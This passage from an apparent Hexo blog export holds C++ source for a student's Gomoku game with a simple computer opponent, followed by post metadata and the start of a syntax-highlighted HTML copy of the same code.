1);\n\treturn;\n}\nvoid GameAI()\n{\n\tint turn = 0;\n\tkey = false;\n\tmemset(pos, 0, sizeof(pos));\n\t/*setfillcolor(EGERGB(0, 0, 0));\n\tbar(10, 200, 90, 230);\n\tsetcolor(EGERGB(0, 0, 255));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 205, \"玩家先手\");*/\n\tmouse_msg msg;\n\tbool flag = true;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\t/*if (flag)//flag标记是否开始游戏\n\t\t\t{\n\t\t\t\tif (msg.x >= 10 && msg.x <= 90 && msg.y >= 200 && msg.y <= 230)\n\t\t\t\t{\n\t\t\t\t\tsetfillcolor(EGERGB(0, 0, 0));\n\t\t\t\t\tbar(10, 200, 90, 230);\n\t\t\t\t\tsetcolor(EGERGB(0, 0, 255));\n\t\t\t\t\tsetfont(20, 0, \"宋体\");\n\t\t\t\t\txyprintf(10, 205, \"电脑先手\");\n\t\t\t\t\tflag = false;\n\t\t\t\t}\n\t\t\t}*/\n\t\t\tif (msg.x % 40 < 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (msg.x % 40 > 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (Checker())break;\n\t\t}\n\t}\n}\nvoid GamePeople()\n{\n\tkey = true;\n\tmemset(pos, 0, sizeof(pos));\n\tint turn = 0;\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x % 40 < 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (msg.x % 40 > 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (Checker())break;\n\t\t}\n\t}\n}\nbool Menu()\n{\n\tsetcolor(EGERGB(255, 45, 50));\n\tsetfont(130, 0, \"华文新魏\");\n\txyprintf(150, 60, \"五  子  棋\");\n\tsetbkcolor(EGERGB(0, 0, 255));\n\tsetfillcolor(EGERGB(0, 122, 204));\n\tbar(300, 230, 500, 280);\n\tbar(300, 300, 500, 350);\n\tbar(300, 370, 500, 420);\n\tsetbkmode(TRANSPARENT);\n\tsetfont(40, 15, \"华文楷体\");\n\tsetcolor(EGERGB(255, 255, 255));\n\tsetfontbkcolor(EGERGB(30, 30, 130));\n\touttextxy(320, 235, \"人机对战\");\n\touttextxy(320, 305, \"好友对战\");\n\touttextxy(320, 375, \"退出游戏\");\n\tsetfont(30, 0, \"华文楷体\");\n\touttextxy(230, 480, \"制作人：计实验17-1郭永航\");\n\tsetfont(20, 0, \"方正舒体\");\n\tsetcolor(EGERGB(0, 0, 0));\n\touttextxy(190, 600, \"Copyright (C) 2018 Gomoku. All Rights Reserved.\");\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x >= 300 && msg.x <= 500 && msg.y >= 230 && msg.y <= 280)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tGameAI();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 300 && msg.x <= 500 && msg.y >= 300 && msg.y <= 350)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tGamePeople();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 300 && msg.x <= 500 && msg.y >= 370 && msg.y <= 420)\n\t\t\t{\n\t\t\t\tclosegraph();\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\nbool Choice()\n{\n\tsetfillcolor(EGERGB(0, 0, 0));\n\tbar(10, 150, 90, 180);\n\tbar(10, 200, 90, 230);\n\tsetcolor(EGERGB(255, 255, 255));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 155, \"再来一局\");\n\txyprintf(10, 205, \"返回菜单\");\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x >= 10 && msg.x <= 90 && msg.y >= 150 && msg.y <= 180)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tif (key)GamePeople();\n\t\t\t\telse GameAI();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 10 && msg.x <= 90 && msg.y >= 200 && msg.y <= 230)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tif (Menu())return 1;\n\t\t\t\telse break;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\nint main()\n{\n\tsetinitmode(INIT_RENDERMANUAL);\n\tinitgraph(800, 640);\n\tsetcaption(\"五子棋\");\n\tif (Menu())return 0;\n\twhile (!Choice());\n\treturn 0;\n}\n```","slug":"Gomoku","published":1,"updated":"2020-05-11T09:38:19.675Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkau0011qse56u7pe6w1","content":"<blockquote>\n<p>C++课程设计作业，包含人工智障$AI$</p>\n</blockquote>\n<a id=\"more\"></a>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;graphics.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> pos[<span class=\"number\">20</span>][<span class=\"number\">20</span>];<span class=\"comment\">//\t1●\t\t-1○\t\t0×</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> black[<span class=\"number\">20</span>][<span class=\"number\">20</span>], white[<span class=\"number\">20</span>][<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dir[<span class=\"number\">4</span>][<span class=\"number\">2</span>] = &#123; &#123;<span class=\"number\">-1</span>,<span class=\"number\">-1</span>&#125;,&#123;<span class=\"number\">-1</span>,<span class=\"number\">0</span>&#125;,&#123;<span class=\"number\">-1</span>,<span class=\"number\">1</span>&#125;,&#123;<span class=\"number\">0</span>,<span class=\"number\">-1</span>&#125; &#125;;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> key;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">End</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfont(<span class=\"number\">80</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n == <span class=\"number\">1</span>)xyprintf(<span class=\"number\">240</span>, <span class=\"number\">245</span>, <span class=\"string\">&quot;黑方获胜&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> xyprintf(<span class=\"number\">240</span>, <span class=\"number\">245</span>, <span class=\"string\">&quot;白方获胜&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Checker</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; <span class=\"number\">12</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">12</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span 